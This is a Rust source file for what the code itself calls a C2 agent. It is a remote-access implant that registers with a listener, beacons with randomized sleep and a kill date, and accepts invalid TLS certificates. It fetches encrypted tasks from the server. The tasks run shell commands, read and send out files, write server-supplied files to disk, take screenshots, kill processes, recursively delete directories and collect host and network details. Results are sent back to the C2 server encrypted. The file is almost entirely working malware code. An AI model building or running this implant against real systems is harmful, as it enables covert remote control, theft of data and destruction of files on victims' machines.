use chrono::{NaiveDateTime, Utc};
use reqwest::header::{HeaderMap, USER_AGENT};
use std::{
    collections::HashMap,
    fs::{self, File},
    io::{self, Error, ErrorKind, Read, Write},
    thread,
    time,
    process::Command
};
use url::Url;
use x25519_dalek::{EphemeralSecret, PublicKey, SharedSecret, StaticSecret};

use crate::{
    core::{
        postdata::{CipherData, PlainData, RegisterAgentData},
        tasks::{
            linux::shell::shell,
            screenshot::screenshot
        }
    },
    Config,
    config::listener,
    crypto::aesgcm::{cipher, decipher, EncMessage},
    utils::{
        datetime::{expires_killdate, get_killdate},
        random::{random_name, random_sleeptime},
    },
};

pub async fn run(config: Config) -> Result<(), Error> {
    // Parse the kill date
    let now = Utc::now().naive_utc();
    let killdate = get_killdate(config.killdate.as_str());

    // Get agent into for registration
    let agent_name =  random_name("agent".to_owned());
    let hostname = match Command::new("hostname").output() {
        Ok(h) => {
            String::from_utf8(h.stdout).unwrap().trim().to_string()
        },
        _ => String::from("unknown"),
    };
    let os = std::env::consts::OS.to_string();
    let arch = std::env::consts::ARCH.to_string();
    let listener_url = format!(
        "{}://{}:{}",
        config.listener.proto.to_string(),
        config.listener.host.to_string(),
        config.listener.port.to_owned(),
    );

    let rad = RegisterAgentData::new(
        agent_name.to_string(),
        hostname.to_string(),
        os.to_string(),
        arch.to_string(),
        listener_url.to_string(),
        config.my_public_key.clone(),
    );

    // Initialize client with certificates
    let root_cert = reqwest::Certificate::from_pem(
        config.listener.https_root_cert.as_bytes()
    ).unwrap();
    let client_certs = [
        config.listener.https_client_cert.to_string(),
        config.listener.https_client_key.to_string(),
    ].concat();
    let client_id = reqwest::Identity::from_pem(
        client_certs.as_bytes()
    ).unwrap();

    let client = reqwest::Client::builder()
        .use_rustls_tls()
        .identity(client_id)
        .add_root_certificate(root_cert)
        .danger_accept_invalid_certs(true)
        .build()
        .unwrap();

    // Prepare HTTP request headers
    let mut headers = HeaderMap::new();
    headers.insert(
        USER_AGENT,
        config.listener.user_agent.parse().unwrap(),
    );

    let mut sleeptime = config.sleep.clone();

    // Agent registration process
    let mut registered = false;
    while !registered {
        thread::sleep(
            random_sleeptime(sleeptime.to_owned(), config.jitter.to_owned())
        );
    
        // Register agent
        let response = match client
            .post(format!("{}{}", listener_url.to_string(), config.listener.routes.register.to_string()))
            .headers(headers.clone())
            .json(&rad)
            .send()
            .await
        {
            Ok(resp) => {
                registered = true;
                resp.text().await.unwrap()
            },
            Err(_) => continue,
        };
        // println!("{}", response);
    }

    let plaindata = PlainData::new(agent_name.to_string());

    loop {
        // TODO: Implement graceful shutdown

        if expires_killdate(killdate.clone(), now.clone()) {
            break;
        }

        thread::sleep(
            random_sleeptime(sleeptime.to_owned(), config.jitter.to_owned())
        );

        // Get task
        let task = match client
            .post(format!("{}{}", listener_url.to_string(), config.listener.routes.task_ask.to_string()))
            .headers(headers.clone())
            .json(&plaindata)
            .send()
            .await
        {
            Ok(resp) => {
                let resp = resp.text().await.unwrap();
                if resp == "" {
                    continue;
                }

                let cipherdata: CipherData = serde_json::from_str(&resp).unwrap();
                let deciphered_task = decipher(
                    EncMessage { ciphertext: cipherdata.c, nonce: cipherdata.n },
                    config.my_secret_key.clone(),
                    config.server_public_key.clone(),
                );
                String::from_utf8(deciphered_task).unwrap()
            },
            Err(e) => {
                continue;
            }
        };

        // println!("Task: {task}");

        // Execute task
        let task_args = match shellwords::split(&task) {
            Ok(args) => args,
            Err(_) => continue,
        };

        if task_args.len() == 0 {
            continue;
        }

        match task_args[0].as_str() {
            "cat" => {
                match std::fs::read_to_string(task_args[1].as_str()) {
                    Ok(contents) => {
                        post_task_result(
                            contents.as_bytes(),
                            agent_name.to_string(),
                            listener_url.to_string(),
                            headers.clone(),
                            &client,
                            &config,
                        ).await;
                    }
                    Err(e) => {
                        post_task_result(
                            e.to_string().as_bytes(),
                            agent_name.to_string(),
                            listener_url.to_string(),
                            headers.clone(),
                            &client,
                            &config,
                        ).await;
                    }
                }
            }
            "cd" => {
                match std::env::set_current_dir(task_args[1].as_str()) {
                    Ok(_) => {
                        post_task_result(
                            "The current directory changed successfully.".as_bytes(),
                            agent_name.to_string(),
                            listener_url.to_string(),
                            headers.clone(),
                            &client,
                            &config,
                        ).await;
                    }
                    Err(e) => {
                        post_task_result(
                            e.to_string().as_bytes(),
                            agent_name.to_string(),
                            listener_url.to_string(),
                            headers.clone(),
                            &client,
                            &config,
                        ).await;
                    }
                }
            }
            "cp" => {
                let src = task_args[1].to_string();
                let dest = task_args[2].to_string();

                match fs::copy(src, dest) {
                    Ok(_) => {
                        post_task_result(
                            "Copied successfully.".as_bytes(),
                            agent_name.to_string(),
                            listener_url.to_string(),
                            headers.clone(),
                            &client,
                            &config,
                        ).await;
                    }
                    Err(e) => {
                        post_task_result(
                            e.to_string().as_bytes(),
                            agent_name.to_string(),
                            listener_url.to_string(),
                            headers.clone(),
                            &client,
                            &config,
                        ).await;
                    }
                }
            }
            "download" => {
                match std::fs::File::open(task_args[1].as_str()) {
                    Ok(ref mut f) => {
                        let mut buf = Vec::new();
                        f.read_to_end(&mut buf).unwrap();
                        // Insert the filename at the top position for sending it along with the contents.
                        let f_name = task_args[1].to_string() + "\n";
                        let final_buf = [f_name.as_bytes(), &buf].concat();

                        post_task_result(
                            &final_buf,
                            agent_name.to_string(),
                            listener_url.to_string(),
                            headers.clone(),
                            &client,
                            &config,
                        ).await;
                    }
                    Err(e) => {
                        post_task_result(
                            e.to_string().as_bytes(),
                            agent_name.to_string(),
                            listener_url.to_string(),
                            headers.clone(),
                            &client,
                            &config,
                        ).await;
                    }
                }
            }
            "info" => {
                let mut sys = sysinfo::System::new_all();
                sys.refresh_all();

                let mut output = String::new();
                output = output + "\n";
                output = output + format!("{:<12} : {}\n", "NAME", agent_name.to_string()).as_str();
                output = output + format!("{:<12} : {}\n", "HOSTNAME", hostname.to_string()).as_str();
                output = output + format!("{:<12} : {}\n", "SYSTEM",
                    sysinfo::System::name().unwrap()).as_str();
                output = output + format!("{:<12} : {}\n", "KERNEL",
                    sysinfo::System::kernel_version().unwrap()).as_str();
                output = output + format!("{:<12} : {}\n", "OS", 
                    format!("{}/{}", os.to_string(), arch.to_string())).as_str();
                output = output + format!("{:<12} : {}\n", "LISTENER", listener_url.to_string()).as_str();
                output = output + format!("{:<12} : {}\n", "SLEEP", sleeptime.to_string()).as_str();
                output = output + format!("{:<12} : {}\n", "JITTER", config.jitter.to_string()).as_str();
                output = output + format!("{:<12} : {}\n", "KILLDATE", config.killdate.to_string()).as_str();

                post_task_result(
                    output.as_bytes(),
                    agent_name.to_string(),
                    listener_url.to_string(),
                    headers.clone(),
                    &client,
                    &config,
                ).await;
            }
            "ls" => {
                match std::fs::read_dir(task_args[1].as_str()) {
                    Ok(result) => {
                        let mut output = String::new();
                        output = output + "\n";
                        for path in result {
                            if let Ok(entry) = path {
                                let entry_name = entry.path()
                                    .to_string_lossy()
                                    .split("/")
                                    .last()
                                    .unwrap()
                                    .to_string();

                                if let Ok(metadata) = entry.metadata() {
                                    output = output + format!(
                                        "{:<1} {:<20} {}\n",
                                        if metadata.is_dir() { "D" } else { "F" },
                                        entry_name,
                                        metadata.len()
                                    ).as_str();
                                } else {
                                    output = output + format!(
                                        "{}", entry_name).as_str();
                                }
                            }
                        }

                        post_task_result(
                            output.as_bytes(),
                            agent_name.to_string(),
                            listener_url.to_string(),
                            headers.clone(),
                            &client,
                            &config,
                        ).await;
                    }
                    Err(e) => {
                        post_task_result(
                            e.to_string().as_bytes(),
                            agent_name.to_string(),
                            listener_url.to_string(),
                            headers.clone(),
                            &client,
                            &config,
                        ).await;
                    }
                }
            }
            "mkdir" => {
                match fs::create_dir_all(task_args[1].as_str()) {
                    Ok(_) => {
                        post_task_result(
                            "Directory created successfully.".as_bytes(),
                            agent_name.to_string(),
                            listener_url.to_string(),
                            headers.clone(),
                            &client,
                            &config,
                        ).await;
                    }
                    Err(e) => {
                        post_task_result(
                            e.to_string().as_bytes(),
                            agent_name.to_string(),
                            listener_url.to_string(),
                            headers.clone(),
                            &client,
                            &config,
                        ).await;
                    }
                }
            }
            "net" => {
                let mut sys = sysinfo::System::new_all();
                sys.refresh_all();

                let networks = sysinfo::Networks::new_with_refreshed_list();

                let mut output = String::new();
                output = output + "\n";
                for (interface_name, data) in &networks {
                    output = output + format!(
                        "{interface_name}:\n\t{}\n\t{}/{} B\n",
                        data.mac_address(),
                        data.received(),
                        data.transmitted()
                    ).as_str();
                }

                post_task_result(
                    output.as_bytes(),
                    agent_name.to_string(),
                    listener_url.to_string(),
                    headers.clone(),
                    &client,
                    &config,
                ).await;
            }
            "ps" => {
                let mut sys = sysinfo::System::new_all();
                sys.refresh_all();

                let subcommand = task_args[1].to_string();

                match subcommand.as_str() {
                    "kill" => {
                        let pid: u32 = task_args[2].parse().unwrap();

                        if let Some(process) = sys.process(sysinfo::Pid::from_u32(pid)) {
                            process.kill();

                            post_task_result(
                                "The process killed successfully.".to_string().as_bytes(),
                                agent_name.to_string(),
                                listener_url.to_string(),
                                headers.clone(),
                                &client,
                                &config,
                            ).await;
                        }
                    }
                    "list" => {
                        let args = task_args[2..].join(" ");
                        let fx: Vec<&str> = args.split(":").collect();
                        let filter = fx[0];
                        let exclude = fx[1];
        
                        let mut output = String::new();
                        output = output + "\n";
                        for (pid, process) in sys.processes() {
                            if  (filter == "*" && exclude == "") ||
                                (filter == "*" && !process.name().contains(exclude.clone())) ||
                                (process.name().contains(filter.clone()) && exclude == "") ||
                                (process.name().contains(filter.clone()) && !process.name().contains(exclude.clone()))
                            {
                                output = output + format!("{pid}\t{}\n", process.name()).as_str();
                            }
                        }
        
                        post_task_result(
                            output.as_bytes(),
                            agent_name.to_string(),
                            listener_url.to_string(),
                            headers.clone(),
                            &client,
                            &config,
                        ).await;
                    }
                    _ => {
                        post_task_result(
                            "Subcommand not specified.".to_string().as_bytes(),
                            agent_name.to_string(),
                            listener_url.to_string(),
                            headers.clone(),
                            &client,
                            &config,
                        ).await;
                    }
                }

            }
            "pwd" => {
                match std::env::current_dir() {
                    Ok(result) => {
                        post_task_result(
                            result.to_str().unwrap().as_bytes(),
                            agent_name.to_string(),
                            listener_url.to_string(),
                            headers.clone(),
                            &client,
                            &config,
                        ).await;
                    }
                    Err(e) => {
                        post_task_result(
                            e.to_string().as_bytes(),
                            agent_name.to_string(),
                            listener_url.to_string(),
                            headers.clone(),
                            &client,
                            &config,
                        ).await;
                    }
                }
            }
            "rm" => {
                if task_args.len() == 2 {
                    match std::fs::remove_file(task_args[1].as_str()) {
                        Ok(_) => {
                            post_task_result(
                                "File removed successfully.".as_bytes(),
                                agent_name.to_string(),
                                listener_url.to_string(),
                                headers.clone(),
                                &client,
                                &config,
                            ).await;
                        }
                        Err(e) => {
                            post_task_result(
                                e.to_string().as_bytes(),
                                agent_name.to_string(),
                                listener_url.to_string(),
                                headers.clone(),
                                &client,
                                &config,
                            ).await;
                        }
                    }
                } else {
                    // When the `-r` flag is specified,
                    match std::fs::remove_dir_all(task_args[1].as_str()) {
                        Ok(_) => {
                            post_task_result(
                                "Directory removed successfully.".as_bytes(),
                                agent_name.to_string(),
                                listener_url.to_string(),
                                headers.clone(),
                                &client,
                                &config,
                            ).await;
                        }
                        Err(e) => {
                            post_task_result(
                                e.to_string().as_bytes(),
                                agent_name.to_string(),
                                listener_url.to_string(),
                                headers.clone(),
                                &client,
                                &config,
                            ).await;
                        }
                    }
                }
            }
            "screenshot" => {
                match screenshot().await {
                    Ok(result) => {
                        post_task_result(
                            &result,
                            agent_name.to_string(),
                            listener_url.to_string(),
                            headers.clone(),
                            &client,
                            &config,
                        ).await;
                    }
                    Err(e) => {
                        post_task_result(
                            e.to_string().as_bytes(),
                            agent_name.to_string(),
                            listener_url.to_string(),
                            headers.clone(),
                            &client,
                            &config,
                        ).await;
                    }
                }
            }
            "shell" => {
                match shell(task_args[1..].join(" ").to_string()).await {
                    Ok(result) => {
                        post_task_result(
                            &result,
                            agent_name.to_string(),
                            listener_url.to_string(),
                            headers.clone(),
                            &client,
                            &config,
                        ).await;
                    }
                    Err(e) => {
                        post_task_result(
                            e.to_string().as_bytes(),
                            agent_name.to_string(),
                            listener_url.to_string(),
                            headers.clone(),
                            &client,
                            &config,
                        ).await;
                    }
                }
            }
            "sleep" => {
                sleeptime = task_args[1].parse().unwrap();

                post_task_result(
                    "The sleep time changed successfully.".as_bytes(),
                    agent_name.to_string(),
                    listener_url.to_string(),
                    headers.clone(),
                    &client,
                    &config,
                ).await;
            }
            "upload" => {
                let file_to_download = task_args[1].to_string();
                let mut dest = task_args[2].to_string();
                // Adjust dest path
                if dest.as_str() == "." {
                    dest = file_to_download.split("/").last().unwrap().to_string();
                }

                let resp_data = match download(
                    file_to_download.as_bytes(),
                    agent_name.to_string(),
                    listener_url.to_string(),
                    headers.clone(),
                    &client,
                    &config,
                ).await {
                    Ok(d) => d,
                    Err(e) => {
                        post_task_result(
                            e.to_string().as_bytes(),
                            agent_name.to_string(),
                            listener_url.to_string(),
                            headers.clone(),
                            &client,
                            &config,
                        ).await;

                        continue;
                    }
                };

                let mut f = match fs::File::create(dest) {
                    Ok(f) => f,
                    Err(e) => {
                        post_task_result(
                            e.to_string().as_bytes(),
                            agent_name.to_string(),
                            listener_url.to_string(),
                            headers.clone(),
                            &client,
                            &config,
                        ).await;

                        continue;
                    }
                };

                match f.write_all(&resp_data) {
                    Ok(_) => {
                        post_task_result(
                            "Uploaded file successfully.".as_bytes(),
                            agent_name.to_string(),
                            listener_url.to_string(),
                            headers.clone(),
                            &client,
                            &config,
                        ).await;
                    }
                    Err(e) => {
                        post_task_result(
                            e.to_string().as_bytes(),
                            agent_name.to_string(),
                            listener_url.to_string(),
                            headers.clone(),
                            &client,
                            &config,
                        ).await;
                    }
                }

            }
            "whoami" => {
                let username = format!("{}@{}", whoami::hostname(), whoami::username());
                post_task_result(
                    username.as_bytes(),
                    agent_name.to_string(),
                    listener_url.to_string(),
                    headers.clone(),
                    &client,
                    &config,
                ).await;
            }
            _ => {
                continue;
            }
        }
    }
    
    Ok(())
}

// Send task result to the C2 server
async fn post_task_result(
    plaindata: &[u8],
    agent_name: String,
    listener_url: String,
    headers: HeaderMap,
    client: &reqwest::Client,
    config: &Config,
) {
    let cipherdata = CipherData::new(
        agent_name,
        plaindata,
        config.my_secret_key.clone(),
        config.server_public_key.clone(),
    );

    client
        .post(format!("{}{}", listener_url, config.listener.routes.task_result.to_string()))
        .headers(headers)
        .json(&cipherdata)
        .send()
        .await;
}

// Download a file from the C2 server
async fn download(
    plaindata: &[u8],
    agent_name: String,
    listener_url: String,
    headers: HeaderMap,
    client: &reqwest::Client,
    config: &Config,
) -> Result<Vec<u8>, Error> {
    let cipherdata = CipherData::new(
        agent_name,
        plaindata,
        config.my_secret_key.clone(),
        config.server_public_key.clone(),
    );

    let resp = client
        .post(format!("{}{}", listener_url, config.listener.routes.task_upload.to_string()))
        .headers(headers)
        .json(&cipherdata)
        .send()
        .await
        .unwrap()
        .bytes()
        .await
        .unwrap()
        .to_vec();

    Ok(resp)
}